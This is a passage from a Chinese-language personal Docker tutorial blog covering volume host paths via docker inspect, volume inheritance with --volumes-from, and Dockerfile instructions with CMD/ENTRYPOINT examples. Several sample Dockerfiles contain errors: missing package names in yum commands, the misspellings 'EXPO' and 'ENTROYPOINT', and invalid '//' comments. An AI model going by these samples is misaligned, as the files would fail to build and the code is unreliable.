<p>方法：docker inspect 容器id</p>
<p>终端test：<br>查找宿主机的目录地址</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@localhost /]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">299d9be66cf2        zzyy/centos         <span class="string">"/bin/sh -c /bin/bash"</span>   3 minutes ago       Up 3 minutes                            gifted_fermat</span><br><span class="line">[root@localhost /]# docker inspect 299d9be66cf2</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>省略<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">        <span class="string">"Mounts"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"Type"</span>: <span class="string">"volume"</span>,</span><br><span class="line">                <span class="string">"Name"</span>: <span class="string">"ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941"</span>,</span><br><span class="line">                <span class="string">"Source"</span>: <span class="string">"/var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data"</span>,</span><br><span class="line">                <span class="string">"Destination"</span>: <span class="string">"/dataVolumeContainer1"</span>,</span><br><span class="line">                <span class="string">"Driver"</span>: <span class="string">"local"</span>,</span><br><span class="line">                <span class="string">"Mode"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="string">"RW"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">"Propagation"</span>: <span class="string">""</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"Type"</span>: <span class="string">"volume"</span>,</span><br><span class="line">                <span class="string">"Name"</span>: <span class="string">"d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c"</span>,</span><br><span class="line">                <span class="string">"Source"</span>: <span class="string">"/var/lib/docker/volumes/d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c/_data"</span>,</span><br><span class="line">                <span class="string">"Destination"</span>: <span class="string">"/dataVolumeContainer2"</span>,</span><br><span class="line">                <span class="string">"Driver"</span>: <span class="string">"local"</span>,</span><br><span class="line">                <span class="string">"Mode"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="string">"RW"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">"Propagation"</span>: <span class="string">""</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>省略<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">[root@localhost /]#</span><br></pre></td></tr></table></figure>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">在节点Mounts节点中已经给出了宿主机的目录地址</span><br><span class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">docker</span>/<span class="title">volumes</span>/<span class="title">ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941</span>/<span class="title">_data</span> 对应的是 /<span class="title">dataVolumeContainer1</span></span></span><br><span class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">docker</span>/<span class="title">volumes</span>/<span class="title">d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c</span>/<span class="title">_data</span> 对应的是 /<span class="title">dataVolumeContainer2</span></span></span><br></pre></td></tr></table></figure>
<h2 id="主机对应默认地址"><a href="#主机对应默认地址" class="headerlink" title="主机对应默认地址"></a><font color = gree>主机对应默认地址</font></h2><p>终端container：<br>进入 dataVolumeContainer1 中，编辑 container.txt</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">[root@<span class="number">299</span>d9be66cf2 /]# ls</span><br><span class="line">anaconda-post.log  dataVolumeContainer1  dev  home  lib64  mnt  <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">bin</span> <span class="title">               dataVolumeContainer2</span> <span class="title"> etc</span> <span class="title"> lib</span> <span class="title">  media</span> <span class="title"> opt</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span> <span class="title"> usr</span></span><br><span class="line"><span class="title">[root@299d9be66cf2</span> /]#<span class="title"> cd</span> dataVolumeContainer1/</span><br><span class="line">[root@299d9be66cf2<span class="title"> dataVolumeContainer1]#</span> ls</span><br><span class="line">[root@299d9be66cf2<span class="title"> dataVolumeContainer1]#</span> echo "container<span class="title"> add"&gt;</span> container.txt</span><br><span class="line">[root@299d9be66cf2<span class="title"> dataVolumeContainer1]#</span> cat<span class="title"> container.txt</span> </span><br><span class="line">container<span class="title"> add</span></span><br><span class="line"><span class="title">[root@299d9be66cf2</span> dataVolumeContainer1]#</span><br></pre></td></tr></table></figure>
<p>终端host：<br>进入/var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data 目录中：</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@localhost /</span>]<span class="meta"># cd /var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data</span></span><br><span class="line">[<span class="meta">root@localhost _data</span>]<span class="meta"># ls</span></span><br><span class="line">container.txt</span><br><span class="line">[<span class="meta">root@localhost _data</span>]<span class="meta"># cat container.txt </span></span><br><span class="line">container <span class="keyword">add</span></span><br><span class="line">[<span class="meta">root@localhost _data</span>]<span class="meta">#</span></span><br></pre></td></tr></table></figure>




<h1 id="数据卷的继承（继承之后各个容器共享数据卷）"><a href="#数据卷的继承（继承之后各个容器共享数据卷）" class="headerlink" title="数据卷的继承（继承之后各个容器共享数据卷）"></a><font color=red>数据卷的继承（继承之后各个容器共享数据卷）</font></h1><p>使用同一个镜像创建容器<br>假设之前已经使用dockerfile创建的镜像创建了一个容器dc-01<br>1丶创建容器继承dc-01数据卷</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker run -it --name dc<span class="number">-02</span> --volumes-<span class="keyword">from</span> dc<span class="number">-01</span> dockerfile/centos</span><br></pre></td></tr></table></figure>
<p>此时在对应的容器卷文件夹下已经可以共享文件了；dc-02创建的文件dc-1也能读写</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerfile解析</title>
    <url>/undefined/dockerfile%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a><font color = yellow >Dockerfile</font></h1><h2 id="dockerfile是什么："><a href="#dockerfile是什么：" class="headerlink" title="dockerfile是什么："></a><font color = red>dockerfile是什么：</font></h2><p>Dockerfile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p>
<h3 id="构建三步骤"><a href="#构建三步骤" class="headerlink" title="构建三步骤"></a><font color = gree >构建三步骤</font></h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>丶编写Dockerfile 文件</span><br><span class="line"><span class="number">2</span>丶docker build 创建镜像</span><br><span class="line"><span class="number">3</span>丶docker run 运行容器</span><br></pre></td></tr></table></figure>
<h3 id="文件什么样？"><a href="#文件什么样？" class="headerlink" title="文件什么样？"></a><font color = gree>文件什么样？</font></h3><h4 id="以我们熟悉的centos为例："><a href="#以我们熟悉的centos为例：" class="headerlink" title="以我们熟悉的centos为例："></a>以我们熟悉的centos为例：</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line"><span class="keyword">MAINTAINER</span> The CentOS Project &lt;cloud-ops@centos.org&gt;</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> c68-docker.tar.xz /</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> name=<span class="string">"CentOS Base Image"</span> \</span></span><br><span class="line"><span class="bash">    vendor=<span class="string">"CentOS"</span> \</span></span><br><span class="line"><span class="bash">    license=<span class="string">"GPLv2"</span> \</span></span><br><span class="line"><span class="bash">    build-date=<span class="string">"2016-06-02"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Default command</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"/bin/bash"</span>]</span></span><br></pre></td></tr></table></figure>
<h1 id="Dockerfile-构建过程解析"><a href="#Dockerfile-构建过程解析" class="headerlink" title=" Dockerfile 构建过程解析"></a><font color = yellow> Dockerfile 构建过程解析</font></h1><h3 id="Docker内容基础知识"><a href="#Docker内容基础知识" class="headerlink" title="Docker内容基础知识"></a><font color = gree>Docker内容基础知识</font></h3><ul>
<li>1：每条表指令都必须为大写字母且后面要跟随至少一个参数</li>
<li>2：指令按照从上到下，顺序执行</li>
<li>3：#表示注释</li>
<li>4：每条指令都会创建一个新的镜像层，并对镜像进行提交<h3 id="Docker执行Dockerfile的大致流程"><a href="#Docker执行Dockerfile的大致流程" class="headerlink" title="Docker执行Dockerfile的大致流程"></a><font color = gree>Docker执行Dockerfile的大致流程</font></h3></li>
<li>1：docker从基础镜像运行一个容器</li>
<li>2：执行一条指令并对容器做出修改</li>
<li>3：执行类似docker commit的操作提交一个新的镜像层</li>
<li>4：docker再基于刚提交的镜像运行一个新容器</li>
<li>5：执行dockerfile中的下一条指令知道所有指令都执行完成<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h4 id="从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断"><a href="#从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断" class="headerlink" title="从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断"></a><font color = red>从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断</font></h4></li>
<li>Dockerfile是原件的原材料</li>
<li>Docker镜像是原件的交付品</li>
<li>Docker容器则可以认为是软件的运行态<br>Dockerfile面向开发，Docker镜像成为交付标准，Docker容器则涉及部署与运维，三者缺一不可</li>
</ul>
<hr>
<ul>
<li><p>1丶Dockerfile，需要定义一个Dockerfile，Dockerfile定 义了进程需要的一-切东西。Dockerfile涉及的内容包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进程和内核进程（当应用进程需要和系统服务和内核进程打交道，这时需要考虑如何设计namespace的权限控制）等等；</p>
</li>
<li><p>2丶Docker镜像，在用Dockerfile定义-一个 文件之后，docker build时会产生–个Docker镜像，当运行Docker镜像时，会真正开始提供服务；</p>
</li>
<li><p>3丶Docker容器，容器是直接提供服务的。</p>
</li>
</ul>
<hr>
<h1 id="DockerFile体系结构"><a href="#DockerFile体系结构" class="headerlink" title="DockerFile体系结构"></a><font color = yellow>DockerFile体系结构</font></h1><ul>
<li><p><font color = gree>FROM</font><br>基础镜像，当前新镜像是基于哪个镜像的</p>
</li>
<li><p><font color = gree>MAINTAINER</font><br>镜像维护者的姓名和邮箱地址</p>
</li>
<li><p><font color = gree>RUN</font><br>容器构建时需要运行的命令</p>
</li>
<li><p><font color = gree>EXPOSE</font><br>当前容器对外暴露出的端口</p>
</li>
<li><p><font color = gree>WORKDIR</font><br>指定在创建容器后，终端默认登录的进来的工作目录，一个落脚点<br>举例：默认打开centos的目录为根目录”/“  ，就是WORKDIR指定的落脚点</p>
</li>
<li><p><font color = gree>ENV</font><br>用来在构建镜像过程中设置环境变量</p>
</li>
<li><p><font color = gree>ADD</font><br>将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</p>
</li>
<li><p><font color = gree>COPY</font><br>类似ADD，拷贝文件和目录到镜像中。<br>将从构建上下文目录中&lt;源路径&gt;的文件/目录复制到新的–层的镜像内的&lt;目标路径&gt;位置<br>COPY src dest<br>COPY [“src”,”dest”]</p>
</li>
<li><p><font color = gree>VOLUME</font><br>容器数据卷，用于数据保存和持久化工作</p>
</li>
<li><p><font color = gree>CMD</font><br>指定一个容器启动时要运行的命令:<br>Dockerfile 中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换</p>
</li>
<li><p><font color = gree>ENTRYPOINT</font><br>指定一个容器启动时要运行的命令<br>ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及参数</p>
</li>
<li><p><font color = gree>ONBUILD</font><br>当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发</p>
</li>
</ul>
<h1 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a><font color = yellow>案例一</font></h1><ul>
<li><p><font color = gree>Base镜像(scratch)</font><br>DockerHub中99%的镜像都是通过在base<br>镜像中安装和配置需要的软件构建出来的</p>
</li>
<li><p><font color = gree>自定义镜像mycentos</font><br>1丶编写<br>Hub默认CentOS镜像什么情况   </p>
</li>
</ul>
<p>1.初始centos运行该镜像时默认路径是根<br>2.默认不支持vim<br>3.默认不支持ifconfig<br>准备编写DockerFile文件<br>myCentOS内容DockerFile<br>2丶构建<br>docker build -t 新镜像名字：TAG .<br>3丶运行<br>docker run -it<br>4丶列出镜像的变更历史<br>docker history 镜像ID</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos                //设置基础镜像为centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> yym&lt;yimingy72@gmail.com&gt;  //设置作者和作者邮箱</span><br><span class="line"><span class="keyword">ENV</span> mypath /tmp            //设置环境变量mypath为 /tmp</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$mypath</span>           //设置落脚点为 /tmp</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  yum  -y  install       //安装Vim </span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  yum  -y  net-tools    //安装net-tool   </span></span><br><span class="line">EXPO <span class="number">80</span>                    //设置运行端口</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash              //设置运行命令</span></span><br></pre></td></tr></table></figure>
<h1 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a><font color = yellow>案例二</font></h1><h3 id="CMD-ENTRYPOINT镜像案例："><a href="#CMD-ENTRYPOINT镜像案例：" class="headerlink" title="CMD/ENTRYPOINT镜像案例："></a>CMD/ENTRYPOINT镜像案例：</h3><ul>
<li><p>都是指定一个容器启动时要运行的命令   </p>
</li>
<li><p>CMD<br>Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换<br>Case<br>tomcat的讲解演示    </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker run -it -p <span class="number">8888</span>:<span class="number">8080</span> tomcat ls -l</span><br></pre></td></tr></table></figure></li>
<li><p>ENTRYPOINT<br>docker run之后的参数会被当做参数传递给ENTRYPOINT，之后形成新的命令组合<br>Case<br>制作CMD版可以查询IP信息的容器<br>问题<br>WHY<br>制作ENTROYPOINT版查询IP信息的容器</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum install -y curl               //安装curl命令</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"curl"</span>,<span class="string">"-s"</span>,<span class="string">"http://ip.cn"</span>]         //查IP</span></span><br></pre></td></tr></table></figure>
<p>制作ENTROYPOINT版查询IP信息的容器,可以追加命令docker run myip -i返回文件头</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum install -y curl               //安装curl命令</span></span><br><span class="line">ENTROYPOINT [<span class="string">"curl"</span>,<span class="string">"-s"</span>,<span class="string">"http://ip.cn"</span>]         //查IP</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
